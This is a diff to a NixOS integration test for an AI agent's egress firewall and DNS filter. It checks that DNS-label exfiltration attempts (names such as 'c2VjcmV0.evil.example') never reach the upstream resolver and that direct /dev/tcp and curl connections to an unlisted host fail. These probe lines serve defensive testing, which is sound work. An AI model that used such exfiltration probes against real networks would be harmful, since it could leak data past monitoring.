@@ -14,7 +14,10 @@
 #     onto an "edge" address the test rotates. Asserted: a freshly
 #     rotated address is connectable as soon as the agent resolves it;
 #     an address the resolver never handed out is not, even for an
-#     allowlisted name; an unlisted name resolves but cannot connect.
+#     allowlisted name; an unlisted name (A, AAAA, PTR) is answered
+#     NXDOMAIN by the agent's own resolver and the upstream never sees
+#     the query (no DNS-label exfiltration); no guest process but
+#     dnsmasq can query the upstream directly.
 #
 # Nested-VM gate: starting microvm@research-agent.service would require
 # nested KVM in the outer test QEMU. Some CI / dev hosts don't expose
@@ -105,7 +108,7 @@ pkgs.testers.runNixOSTest {
     imports = [ ../modules/nixos/research-agent-egress.nix ];
     researchAgent.egress.upstreamDns = nodes.upstream.networking.primaryIPAddress;
     networking.enableIPv6 = false;
-    environment.systemPackages = [ pkgs.curl ];
+    environment.systemPackages = [ pkgs.curl pkgs.dig ];
   };
 
   # Stands in for "the internet": an authoritative-enough resolver plus a
@@ -113,9 +116,11 @@ pkgs.testers.runNixOSTest {
   # its real shape — a CNAME chain whose final A record (the Akamai edge)
   # the test rewrites to simulate rotation. evil.example is not on the
   # allowlist. Plain HTTP on :443 is enough: the guest rule is
-  # `tcp dport 443`, TLS is irrelevant to the firewall.
+  # `tcp dport 443`, TLS is irrelevant to the firewall. log-queries is
+  # the witness for "the upstream never saw it".
   nodes.upstream = { pkgs, ... }: {
     networking.firewall.enable = false;
+    environment.systemPackages = [ pkgs.dig ];
     networking.interfaces.eth1.ipv4.addresses = lib.mkAfter (map
       (n: { address = "192.168.1.${toString n}"; prefixLength = 24; })
       [ 10 11 12 13 ]);
@@ -131,6 +136,7 @@ pkgs.testers.runNixOSTest {
           "global-api.ebaycdn.net,ebay-edge.akamaiedge.net"
         ];
         local-ttl = 1;
+        log-queries = true;
       };
     };
     systemd.tmpfiles.rules = [ "d /run/fake-dns 0755 root root -" ];
@@ -147,7 +153,7 @@ pkgs.testers.runNixOSTest {
     };
   };
 
-  testScript = ''
+  testScript = { nodes, ... }: ''
     dellan.wait_for_unit("multi-user.target")
 
     # microvm.nix install-microvm-<name> oneshot exists and runs cleanly.
@@ -461,19 +467,48 @@ pkgs.testers.runNixOSTest {
     ip = connect("api.ebay.com")
     assert ip == "192.168.1.13", f"edge not opened by resolution, got {ip!r}"
 
-    # 4. Unlisted name: it resolves through the same resolver (so the
-    #    failure below is the firewall, not DNS) and its address serves
-    #    (control from the upstream side), yet the agent cannot connect.
-    agent.succeed("getent ahostsv4 evil.example | grep -q 192.168.1.12")
-    upstream.succeed("curl -sS -m 5 -o /dev/null http://192.168.1.12:443/")
-    agent.fail("curl -sS -m 5 -o /dev/null http://evil.example:443/")
+    assert "192.168.1.10" in egress_set(), "resolved edge address must be in the egress set"
 
-    # 5. Port 53 is open only towards the configured upstream resolver.
-    #    upstream's dnsmasq listens on every address, so .12:53 accepts
-    #    TCP from an unfiltered node (dellan, same vlan) — not from the
-    #    agent.
+    # 4. Unlisted names never leave the guest as DNS. Control first: the
+    #    upstream itself WOULD answer evil.example, so the NXDOMAIN below
+    #    is the agent's resolver refusing to forward, not the upstream.
+    upstream.succeed("dig +short @127.0.0.1 evil.example | grep -qx 192.168.1.12")
+    for name in ["exfil-test.example.com", "c2VjcmV0.evil.example"]:
+        agent.fail(f"getent ahostsv4 {name}")
+        for qtype in ["A", "AAAA"]:
+            status = agent.succeed(
+                f"dig +time=3 +tries=1 @127.0.0.1 {name} {qtype} | grep -o 'status: [A-Z]*'"
+            ).strip()
+            assert status == "status: NXDOMAIN", f"{name} {qtype}: {status!r}"
+    # Reverse lookup of an address /etc/hosts doesn't name (dnsmasq
+    # answers the test nodes' own addresses from /etc/hosts, locally).
+    status = agent.succeed(
+        "dig +time=3 +tries=1 @127.0.0.1 -x 203.0.113.7 | grep -o 'status: [A-Z]*'"
+    ).strip()
+    assert status == "status: NXDOMAIN", f"PTR 203.0.113.7: {status!r}"
+    upstream_log = upstream.succeed("journalctl -u dnsmasq.service --no-pager")
+    # Positive control: the log does record what the agent forwarded.
+    assert "query[A] api.ebay.com from" in upstream_log, "upstream query log not working"
+    for leaked in ["exfil-test", "c2VjcmV0", "7.113.0.203.in-addr.arpa"]:
+        assert leaked not in upstream_log, f"{leaked!r} reached the upstream resolver"
+    # And the firewall still holds for the unlisted name's address even
+    # if the agent already knows it.
+    upstream.succeed("curl -sS -m 5 -o /dev/null http://192.168.1.12:443/")
+    agent.fail(
+        "curl -sS -m 5 -o /dev/null --resolve evil.example:443:192.168.1.12 "
+        "http://evil.example:443/"
+    )
+
+    # 5. Port 53 is open only towards the configured upstream resolver,
+    #    and only for dnsmasq. upstream's dnsmasq listens on every
+    #    address, so .12:53 accepts TCP from an unfiltered node (dellan,
+    #    same vlan) — not from the agent. A root process on the agent
+    #    asking the upstream directly (skipping dnsmasq's name filter)
+    #    gets no answer, even for an allowlisted name.
     dellan.succeed("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
     agent.fail("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
+    agent.fail("dig +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.ebay.com")
+    agent.fail("dig +tcp +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.ebay.com")
 
     final = egress_set()
     print("[diag] set after test:\n" + final)
